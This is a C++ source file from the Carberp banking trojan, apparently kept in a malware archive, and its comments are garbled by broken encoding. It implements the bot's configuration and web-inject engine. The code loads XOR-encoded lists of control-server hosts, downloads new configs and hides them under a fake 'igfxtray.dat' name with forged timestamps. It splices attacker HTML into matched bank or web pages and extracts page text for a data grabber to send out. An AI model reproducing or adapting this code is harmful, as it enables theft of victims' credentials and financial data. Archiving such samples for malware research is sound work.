/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
#include <windows.h>

#include "BotConfig.h"
#include "GetApi.h"
#include "Strings.h"
#include "Memory.h"
#include "Utils.h"
#include "Config.h"
#include "Crypt.h"
#include "BotUtils.h"
#include "Loader.h"

#include "Modules.h"

//#include "BotDebug.h"



bool bHttp;
bool bHttps;

// ����� ������ �������
PBotConfig BotConfig;

// ������� � ������� ���������� ������
DWORD ConfigProcess = 0;

// ����� ��������� �������� �������
DWORD LastLoadConfigTime = 0;


#ifdef BV_APP
	LPVOID InjectEventData;       // ������ ��� ������ �������
	THTMLInjectEvent InjectEvent; // ���������� ������� HTML �������



	void SetHTMLInjectEvent(LPVOID Data, THTMLInjectEvent Event)
	{
		// ������� ������������� ���������� ������� ��� ������� HTML
		InjectEventData = Data;
		InjectEvent = Event;
	}


	void CallHTMLInjectEvent(LPVOID Sender, THTMLInjectEventID ID, LPVOID Reserved)
	{
		// �������� ������� �������
		if (InjectEvent != NULL)
		{
    		InjectEvent(InjectEventData, Sender, ID, Reserved);
		}
	}
#endif


void GetCurrentConfigHostSetings(bool * http, bool * https)
{
	*http	=	bHttp;
	*https	=	bHttps;
}


PCHAR FgrHostFromCfg = NULL;//1
PCHAR GraHostFromCfg = NULL;//2
PCHAR ScrHostFromCfg = NULL;//3
PCHAR SniHostFromCfg = NULL;//4
PCHAR PluginsHostFromCfg = NULL;//5
DWORD TimeOut=70;

/*
char* GetCurrentHostFromConfig(int Num)
{
	char * Res;
	if (Num==1)Res=FgrHostFromCfg;
	if (Num==2)Res=GraHostFromCfg;
	if (Num==3)Res=ScrHostFromCfg;
	if (Num==4)Res=SniHostFromCfg;
	if (Res==NULL)return NULL;
	char* Domain;
	char *cUrl;
	int i;



	while(true)
	{
		cUrl= m_strstr(Res,"|");
		if (cUrl==NULL)
		{
			Domain=NULL;
			break;
		}
		i=m_lstrlen(Res)-m_lstrlen(cUrl);
		Domain=(char*)MemAlloc(i+1);
		m_memcpy(Domain,Res,i);
		if (!CheckHost(Domain))
		{
			Res+=i+1;
			MemFree(Domain);
		}
		else 
			break;
	}


	return Domain;
}



DWORD GetConfigTimeOut()
{
	return TimeOut;
}

*/
//----------------------------------------------------------------------------

PCHAR ReadStrBlock_(PCHAR &Buf)
{
	// ������� ������ ������ �� ������ � ������� ��������� �� ������
	// ������ ������ (DWORD - ����� ������)(������)
	DWORD Size = *(DWORD *)Buf;
	Buf += sizeof(DWORD);
	if (Size == 0)
		return NULL;
	PCHAR Str = STR::New(Buf, Size);
	Buf += Size;
	return Str;
}


bool LoadConfigFromFileEx(PBotConfig Config, PWCHAR FileName)
{

	//��������� ���������������� ����
	if (BotConfig == NULL || FileName == NULL)
		return false;

	#ifdef DebugUtils
		Debug::MessageEx("BotConfig", 0, "Load File", NULL, "��������� ���������������� ����");
	#endif


	HANDLE File = (HANDLE)pCreateFileW(FileName, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0 );

	if (File == INVALID_HANDLE_VALUE)
	{
		#ifdef DebugUtils
			Debug::MessageEx("BotConfig", 0, "Load File", NULL, "������ ��������");
		#endif
		return false;

	}

	DWORD h = 0;
	DWORD FileSize = (DWORD)pGetFileSize(File, &h);
	LPBYTE FileBuf = (LPBYTE)MemAlloc(FileSize);
	if (FileBuf == NULL)
	{
		pCloseHandle(File);
		return false;
	}

	DWORD Readed = 0;
	if (!pReadFile(File, FileBuf, FileSize, &Readed, NULL))
	{
		pCloseHandle(File);
		return false;
	}

	const static char Signature[] = {'B', 'J', 'B', 0};
	PCHAR Buf = (PCHAR)XORCrypt::DecodeBuffer((PCHAR)Signature, FileBuf, Readed);
	if (Buf == NULL)
	{
		pCloseHandle(File);
		return false;
	}



	// ���������� ���� ���������� �������� �������� ���� ����
	Buf++;

	// ���������� ���������� �����
	DWORD Count = *(DWORD*)Buf;
	Buf += sizeof(DWORD);

	// ��������� ���������� � ������

	FgrHostFromCfg = ReadStrBlock_(Buf);
	GraHostFromCfg = ReadStrBlock_(Buf);
	ScrHostFromCfg = ReadStrBlock_(Buf);
	SniHostFromCfg = ReadStrBlock_(Buf);
	PluginsHostFromCfg = ReadStrBlock_(Buf);


	// ������ ���������� �������
	TimeOut = *(DWORD*)Buf;
	Buf += sizeof( DWORD );


	//------------- ��������� ���������� -------------//
	bHttp = *Buf != 0;
	Buf++;

	bHttps = *Buf != 0;
	Buf++;

	//------------- ��������� ������ �������� -------------//
	PHTMLInject Inject;
	PHTMLInjectData Data;
	DWORD DataCount;
    DWORD Mode;
	
	for (DWORD i = 0; i < Count; i++)
	{
		Inject = HTMLInjects::AddInject(BotConfig->HTMLInjects, NULL);
		if (Inject == NULL)
			break;
		// ������ ����� �������	
		Inject->URL = ReadStrBlock_(Buf); 

		// ������ ������ ���������
		Mode = *(DWORD*)Buf;
		Buf += sizeof(DWORD);

		// ������� �������
		// LG  1
		// LP  2
		// GPL  3

		// G   4
		// P   5
		// GP  6
		// ���������� ������ ������ �����
		Inject->GET = (Mode == 1 || Mode == 3 || Mode == 4 || Mode == 6);
		Inject->POST = (Mode == 2 || Mode == 3 || Mode == 5 || Mode == 6);
		Inject->IsLog = (Mode <= 3); 

		DataCount = *(DWORD *)Buf;
		Buf += sizeof(DWORD);

		for (DWORD j = 0; j < DataCount; j++) 
		{
			Data = HTMLInjects::AddInjectData(Inject, NULL, NULL, NULL);
			if (Data == NULL)
				break;

			Data->Before = ReadStrBlock_(Buf);
			Data->Inject = ReadStrBlock_(Buf);
			Data->After = ReadStrBlock_(Buf);
		}
	}
	MemFree(FileBuf);
	pCloseHandle(File);
	#ifdef DebugUtils
		Debug::MessageEx("BotConfig", 0, "Load File", NULL, "������");
	#endif
	return true;
}
//----------------------------------------------------------------------------

void FreeHTMLInjectData(LPVOID Data)
{
	// ���������� ������ HTML �������
	PHTMLInjectData D = (PHTMLInjectData)Data;
	STR::Free(D->Before);
	STR::Free(D->After);
	STR::Free(D->Inject);
	FreeStruct(D);
}

void HTMLInjects::FreeInject(PHTMLInject Inject)
{
	if (Inject == NULL)
		return;

    STR::Free(Inject->URL);
	if (Inject->Injects != NULL)
		List::Free(Inject->Injects);
    FreeStruct(Inject);
}

//----------------------------------------------------------------------------
PList CreateHTMLInjectsList()
{
	PList List = List::Create();
	List::SetFreeItemMehod(List, (TFreeItemMethod)HTMLInjects::FreeInject);
	return List;
}
//----------------------------------------------------------------------------

PBotConfig CreateConfig()
{
	PBotConfig C = CreateStruct(TBotConfig);
	if (C == NULL)
		return NULL;
	C->HTMLInjects = CreateHTMLInjectsList();
	return C;
}
//----------------------------------------------------------------------------

PHTMLInject HTMLInjects::AddInject(PList List, PHTMLInject Source, bool IgnoreDisabledData)
{
	//  �������� ����� HTML ������ � ������
	//	List. ���� ������ �������� Source �� � �����
	//	����� ����������� ��� ��� ������

	PHTMLInject Inject = CreateStruct(THTMLInject);
	if (Inject == NULL)
		return NULL;

	// �������� ������
	if (Source != NULL)
	{
		Inject->URL   = STR::New(Source->URL);
		Inject->GET  = Source->GET;
		Inject->POST  = Source->POST;
		Inject->IsLog = Source->IsLog;

		// �������� ������ ��������
		if (Source->Injects != NULL)
		{
			DWORD Count = List::Count(Source->Injects);
			for (DWORD i = 0; i < Count; i++)
			{
				PHTMLInjectData Data = (PHTMLInjectData)List::GetItem(Source->Injects, i);
				if (!Data->Disabled || !IgnoreDisabledData)
					HTMLInjects::AddInjectData(Inject, Data->Before, Data->After, Data->Inject);
			}
		}
    }

	if (List != NULL)
		List::Add(List, Inject);
	return Inject;
}
//----------------------------------------------------------------------------

void HTMLInjects::ResetStatus(PList Injects)
{
	// �������� ������ ��������
	for (DWORD i = 0; i < List::Count(Injects); i++)
	{
		PHTMLInject Inject = (PHTMLInject)List::GetItem(Injects, i);
		Inject->Used = false;
		for (DWORD j = 0; j < List::Count(Inject->Injects); j++)
		{
			PHTMLInjectData Data = (PHTMLInjectData)List::GetItem(Inject->Injects, j);
			Data->State = idsUnknown;
		}
	}
}
//----------------------------------------------------------------------------


PHTMLInjectData HTMLInjects::AddInjectData(PHTMLInject HTMLInject, PCHAR Before, PCHAR After, PCHAR Inject)
{
	//  AddHTMLInjectData - �������� ����� ������ �������
	if (HTMLInject == NULL)
		return false;

	PHTMLInjectData Data = CreateStruct(THTMLInjectData);
	if (Data == NULL)
		return NULL;

	Data->Before = STR::New(Before);
	Data->After  = STR::New(After);
	Data->Inject = STR::New(Inject);

	if (HTMLInject->Injects == NULL)
	{
		HTMLInject->Injects = List::Create();
        List::SetFreeItemMehod(HTMLInject->Injects, FreeHTMLInjectData);
    }

	List::Add(HTMLInject->Injects, Data);
	Data->Owner = HTMLInject;

    return Data;
}
//----------------------------------------------------------------------------

void HTMLInjects::ClearInjectList(PList List)
{
	// ������� ������� ������ ���������� �������� ���� THTMLInject
	if (List == NULL)
		return;
	List::SetFreeItemMehod(List, (TFreeItemMethod)HTMLInjects::FreeInject);
    List::Clear(List);
}

//----------------------------------------------------------------------------

bool Config::GetInjectsForRequest(PRequest Request)
{
	//  GetInjectsForRequest - �������� ������� ��� �������

	if (Request == NULL || STR::IsEmpty(Request->URL))
		return false;

	// �������������� ���������������� ����
	PBotConfig BotConfig = Config::GetConfig();
	if (BotConfig == NULL)
		return false;

	// �������� ������
	PCHAR URL = Request->URL;
	bool DelURL = false;
	if (Request->Optional != NULL )
	{
		// ��������� � ������ ������������ ������
		PCHAR C = NULL;
		if (STR::Scan(Request->Optional, '?') == NULL) C = "?";
        URL = STR::New(3, Request->URL, C, Request->Optional);
		DelURL = true;
	}

	// ��������� �������
	DWORD Count = List::Count(BotConfig->HTMLInjects);
	for (DWORD i = 0; i < Count; i++)
	{
		PHTMLInject Inject = (PHTMLInject)List::GetItem(BotConfig->HTMLInjects, i);

		if (Inject->Disabled) continue;

		// ���������� ������ � ������
		if ((Request->Method == hmGET && Inject->GET) || (Request->Method == hmPOST && Inject->POST))
			if (CompareUrl(Inject->URL, URL))
			{
                Inject->Used = true;
				#ifdef BV_APP
					CallHTMLInjectEvent(Inject, injMaskFinded, NULL);
				#endif

				if (Request->Injects == NULL)
					Request->Injects = List::Create();

				List::Add(Request->Injects, Inject);
				Request->IsInject = true;

				/*
				if (Request->Injects == NULL)
					Request->Injects = CreateHTMLInjectsList();
				// ��������� ������
				PHTMLInject NewInject = AddHTMLInject(Request->Injects, Inject, true);
				if (NewInject != NULL)
				{
					#ifdef BV_APP	
						NewInject->Source = Inject;
					#endif
					Request->IsInject = true;
                }  */
			}
	}
	//
	if (DelURL)
		STR::Free(URL);

	return Request->IsInject;
}

//----------------------------------------------------------------------------

WCHAR ConfigFileName[MAX_PATH] = {0};
WCHAR ConfigFileName_HP[MAX_PATH] = {0}; // ������ ����� �������� ����������
WCHAR BOT_CONFIG_NAME[]    = {'\\','i','g','f','x','t','r','a','y','.','d','a','t',0};
WCHAR BOT_CONFIG_NAME_HP[] = {'\\','i','g','f','x','t','r','a','y','h', 'p', '.','d','a','t',0};

PWCHAR Config::GetFileName(bool HightPriority)
{
	//  ������� ���������� ��� ����� �� ���������
	PWCHAR FileName = NULL;

	if (!HightPriority)
		FileName = &ConfigFileName[0];
	else
		FileName = &ConfigFileName_HP[0];

	if (*FileName == 0)
	{
		WCHAR *AppPath = GetShellFoldersKey(2);

		if ( AppPath == NULL )
			return NULL;

		plstrcpyW(FileName, AppPath);
		if (!HightPriority)
			plstrcatW(FileName, BOT_CONFIG_NAME);
		else
			plstrcatW(FileName, BOT_CONFIG_NAME_HP);
		
		MemFree( AppPath );
	}


	return FileName;
}

//----------------------------------------------------------------------------
void Config::SetFileName(PWCHAR FileName)
{
	//  ������� ������������� ��� ����� �� ���������
	//DWORD Len = m_wcslen(FileName);
	plstrcpyW(ConfigFileName, FileName);
}

//----------------------------------------------------------------------------

bool Config::IsConfig(PCHAR Buf)
{
	// ������� ���������� ������ ���� ����� �������� ��������
	return StrSame(Buf, "BJB", true, 3);
}
//----------------------------------------------------------------------------

bool Config::Download(PCHAR URL)
{
	pOutputDebugStringA("Config::Download");
	if (STR::IsEmpty(URL))
		return false;

	PCHAR Buf = NULL;

	// ��������� ����
	if (!HTTP::Get(URL, &Buf, NULL))
    	return false;

	// �������������� ����
	#ifdef CryptHTTPH
		if (!IsConfig(Buf))
		{
			PCHAR Password = GetMainPassword();
			RC2Crypt::DecodeStr(Password, Buf);
			STR::Free(Password);
        }
	#endif

    bool Result = IsConfig(Buf);

	// ���������� ������ � ����
	if (Result)
	{
		PWCHAR FileName = GetFileName();

		pSetFileAttributesW(FileName, FILE_ATTRIBUTE_ARCHIVE );

        File::WriteBufferW(FileName, Buf, STR::Length(Buf));

		SetFakeFileDateTime(FileName);
		pSetFileAttributesW(FileName, FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY );

    }

	STR::Free(Buf);

	return Result;
}


//----------------------------------------------------------------------------

PBotConfig Config::Initialize(PWCHAR FileName, bool IsNewApplication, bool DontLoad)
{
	// ���������������� ��������� ����
	if (IsNewApplication)
	{
		BotConfig = NULL;
		LastLoadConfigTime = 0;
	}

	if (BotConfig == NULL)
	{
		BotConfig = CreateConfig();
		if (!DontLoad)
		{
			if (FileName == NULL)
			{
				FileName = GetFileName(true);
				if (!FileExistsW(FileName))
					FileName = GetFileName();
            }

			LoadConfigFromFileEx(BotConfig, FileName);
			LastLoadConfigTime = (DWORD)pGetTickCount();
		}
    }

    return BotConfig;

}

/*
PBotConfig Config::Initialize(PWCHAR FileName, bool DontLoad)
{
	// ���������������� ���������� ��������� ������ ����
	if (IsNewProcess(ConfigProcess))
	{
		// ��������� � ����� ��������
		BotConfig = NULL;
		LastLoadConfigTime = 0;
	}

	if (BotConfig == NULL)
	{
		BotConfig = CreateConfig();
		if (!DontLoad)
		{
			if (FileName == NULL)
				FileName = GetFileName();
			
			LoadConfigFromFileEx(BotConfig, FileName);
			LastLoadConfigTime = (DWORD)pGetTickCount();
		}
    }

    return BotConfig;
}
*/

//----------------------------------------------------------------------------


PBotConfig Config::GetConfig()
{
	// ������� ���������� �� ������ ����
	return BotConfig;
}
//----------------------------------------------------------------------------

void Config::Clear(PBotConfig Config)
{
	// �������� ����� �������
	if (Config == NULL)
        Config = BotConfig;
	if (Config != NULL)
		List::Clear(Config->HTMLInjects);
}
//----------------------------------------------------------------------------

bool HTMLInjects::IsValidInjectData(PHTMLInjectData Data)
{
	// ������� ���������� ������ ���� ������ ��������������
	// ������� �������
	if (Data == NULL)
		return false;

	bool B = !STR::IsEmpty(Data->Before);
	bool I = !STR::IsEmpty(Data->Inject);
	bool A = !STR::IsEmpty(Data->After);

	return (B && I && A) ||
		   (B && A) ||
		   (B && I) ||
		   (I && A);

}
//----------------------------------------------------------------------------

bool SubstitudeText2(PCHAR Buffer, PCHAR &NewBuffer, PCHAR Before, PCHAR Inject, PCHAR After, DWORD &NewBufLen)
{
	// ������� ��������� ����� Inject ����� ������� Before � After
	NewBufLen = 0;
	NewBuffer = NULL;
	if (Buffer == NULL) return false;

	bool B = !STR::IsEmpty(Before);
	bool A = !STR::IsEmpty(After);
	bool I = !STR::IsEmpty(Inject);

	bool Valid = (B && I && A) ||
				 (B && A) ||
				 (B && I) ||
				 (I && A);

	if (!Valid)
		return false;


	// ������� ����� ������
	DWORD BStart = 0;
	DWORD BEnd = 0;
	DWORD BLen = 0;
    // ������� ����� After
	DWORD AStart = 0;
	DWORD AEnd = 0;
	DWORD ALen = 0;

	PCHAR AfterPtr = NULL;

	// ���� ���� Before
	if (B)
	{
		if (!WildCmp(Buffer, Before, &BStart, &BEnd, &BLen))
			return false;
    }



	// ���� ���� After
	if (A)
	{
		PCHAR BeforePtr = Buffer + BEnd;
		if (!WildCmp(BeforePtr, After, &AStart, &AEnd, &ALen))
			return false;
		AfterPtr = BeforePtr + AStart;
		// ���� �� ������ ���� Before �� ��������� ����� ����� �� ������
		// ����� After
		if (!B) BEnd = AStart;
	}
	else
    	AfterPtr = Buffer + BEnd; // ������ ��������� �� ����� ����� Before

    DWORD InjectLen = StrCalcLength(Inject);
	DWORD AfterLen = StrCalcLength(AfterPtr);

	// ������ ����� �����
	NewBufLen = BEnd + InjectLen + AfterLen;
	PCHAR Buf = (PCHAR)MemAlloc(NewBufLen + 1);
	if (Buf == NULL) return false;

	NewBuffer = Buf;

	// �������� ������
	m_memcpy(Buf, Buffer, BEnd);
	Buf += BEnd;
	m_memcpy(Buf, Inject, InjectLen);
	Buf += InjectLen;
	m_memcpy(Buf, AfterPtr, AfterLen);
	Buf += AfterLen;
    *Buf = 0;

    return true;
}
//----------------------------------------------------------------------------

PCHAR GetHTMLLogCode(PCHAR Buffer, PHTMLInject Inject)
{
	// ������� ���������� HTML ��� �������� �������� �������
	if (STR::IsEmpty(Buffer) || Inject == NULL)
		return NULL;

	PStrings S = Strings::Create();
	bool Added = false;
	PCHAR Code;
	PCHAR Tmp;
	DWORD Count = List::Count(Inject->Injects);
	PHTMLInjectData Data;

	for (DWORD i = 0; i < Count; i++)
	{
		Data = (PHTMLInjectData)List::GetItem(Inject->Injects, i);
		Code = GetTextBetween(Buffer, Data->Before, Data->After);
		if (Code != NULL)
		{
			Added = true;
			if (!STR::IsEmpty(Data->Inject))
			{
				Tmp = Code;
				Code = STR::New(3, Data->Inject, ": ", Tmp);
				STR::Free(Tmp);
			}
			Strings::Add(S, Code, false);
	
			Data->State = idsOk;
//			#ifdef BV_APP
//				CallHTMLInjectEvent(Data->Source, injDataHandled, NULL);
//			#endif
        }
    }
	PCHAR Result = NULL;

	if (Added)
		Result = Strings::GetText(S, " ");

	Strings::Free(S);
    return Result;
}

//----------------------------------------------------------------------------

bool SendHTMLLogToServer(PCHAR Buffer, PHTMLInject Inject, PHTTPSessionInfo Session)
{
	// ������� ���������� ����� HTML �� ��������� � ���������� ������
	if (Inject == NULL || !Inject->IsLog)
		return false;


	// �������� ����������� ������
	PCHAR SendBuffer = NULL;

	PCHAR Data = GetHTMLLogCode(Buffer, Inject);

	if (Data == NULL)
		return false;


	DWORD BrowserType = 0;
	PCHAR UserAgent = NULL;
	PCHAR URL = NULL;

	if (Session != NULL)
	{
		BrowserType = Session->BrowserType;
		UserAgent = Session->UserAgent;

		// ��������� ������ ����������� � ����������� ������
		if (Session->URL)
		{
			URL = Session->URL;
			StrConcat(SendBuffer, 3, Session->URL, "|", Data);
			STR::Free(Data);
        }

	}

	if (SendBuffer == NULL)
		SendBuffer = Data;

	//  ����������  ���������� ������
	DataGrabber::AddData(URL, SendBuffer, UserAgent, BrowserType, DATA_TYPE_INJECT);

	STR::Free(SendBuffer);

	return true;
}
//----------------------------------------------------------------------------
bool HTMLInjectReplaceBotID(PCHAR SourceHTML, PCHAR BotID, PCHAR &OutPutHTML)
{
	// ������� ������ ������������� ���� �� ��� ��������

	OutPutHTML = SourceHTML;
	if (STR::IsEmpty(SourceHTML) || STR::IsEmpty(BotID)) return false;

	const static char BotIDName[] = {'%', 'b', 'o', 't', '_', 'i', 'd', '%',  0};

	OutPutHTML = STR::Replace(SourceHTML, (PCHAR)BotIDName, BotID);
	if (OutPutHTML != NULL)
		return true;
	else
		OutPutHTML = SourceHTML;
    return false;
}

//----------------------------------------------------------------------------

bool InjectHTMLCode(PRequest Request, PHTMLInject Inject)
{
	// ����� ������������ ����������� HTML ��������
	if (Request == NULL || Inject == NULL)
		return false;

	PCHAR NewBuffer = NULL;
	DWORD NewLen = 0;

	DWORD Count = List::Count(Inject->Injects);
	PHTMLInjectData Data;
	bool Injected = false; // ������� ����, ��� ��� ��������� ����-�� ���� ������

    PCHAR BotID = GenerateBotID();

	for (DWORD i = 0; i < Count; i++)
	{
		Data = (PHTMLInjectData)List::GetItem(Inject->Injects, i);

		// ������������ ������ ����������
		if (Data->Disabled /*|| Data->State == idsOk*/) continue;


/* TODO :
� ������ ������ ���������� ������� �������������� ���� ��� ������ �������.
��� �� ����������� �������, ��������� ����0�� ����������� ������� ���� ���, ��� ��������
��������. �� � ������ ������ ������� ���� ������� �� ������� ����, ��� ���������� ��������� ��������
���������� ����-�� ������ ��������, ��� � ��� ���.
� ���������� ���������� ����������� ����������� ������� ������� ��������������� ���� */

		PCHAR InjectData = NULL;
        bool FreeInnjectData = HTMLInjectReplaceBotID(Data->Inject, BotID, InjectData);

		//  �������� HTML ��� � ��������
		if (SubstitudeText2((PCHAR)Request->Buffer, NewBuffer, Data->Before, InjectData, Data->After, NewLen))
		{
			// ������ ��������, ������������ ������

			Injected = true;
			Request::SetBuffer(Request, (LPBYTE)NewBuffer, NewLen);

			Data->State = idsOk;

			#ifdef BV_APP
				CallHTMLInjectEvent(Data, injDataHandled, NULL);
			#endif
		}


		if (FreeInnjectData)
            STR::Free(InjectData);

	}

    STR::Free(BotID);

    return Injected;

}

//----------------------------------------------------------------------------

bool HTMLInjects::Execute(PRequest Request, PHTTPSessionInfo Session)
{
	//  ���������� HTML �������.
	//
	//  ������� ���������� ������ ���� � ������
	//  ������� ���� ������� ���������

	if (Request == NULL || !Request->IsInject)
		return false;

    Request->Injected = true; // ������������� ������� ������������ ��������

	bool Result = false;
	PHTMLInject Inject;
	PCHAR NewBuffer;
	DWORD Count = List::Count(Request->Injects);

	for (DWORD i = 0; i < Count; i++)
	{
		Inject = (PHTMLInject)List::GetItem(Request->Injects, i);
		if (Inject->IsLog)
			SendHTMLLogToServer((PCHAR)Request->Buffer, Inject, Session);
		 else
		 {
			// �������� ���� ��� � ����������� ������
			NewBuffer = NULL;
			if (InjectHTMLCode(Request, Inject))
				Result = true;
		  }

	}
	return Result;
}
//----------------------------------------------------------------------------

bool HTMLInjects::SupportContentType(PCHAR CType)
{
	// ������� ���������� ������ ���� ��������� ��� ��������
	// �������������� �������� ������� HTML
	if (CType == NULL)
		return false;
	if (StrSame(CType, "text/", false, 5))
		return true;

	PCHAR Temp;
    bool FreeStr = false;
	if (STR::Scan(CType, ';') != NULL)
	{
		Temp = STR::GetLeftStr(CType, ";");
		FreeStr = true;
    }
	else
		Temp = CType;

	int Result = StrIndexOf(Temp, false, 4,
		"application/x-javascript",
		"application/javascript",
		"application/xml",
		"application/xhtml+xml");
	if (FreeStr)
		STR::Free(Temp);
    return Result >= 0;
}
//----------------------------------------------------------------------------

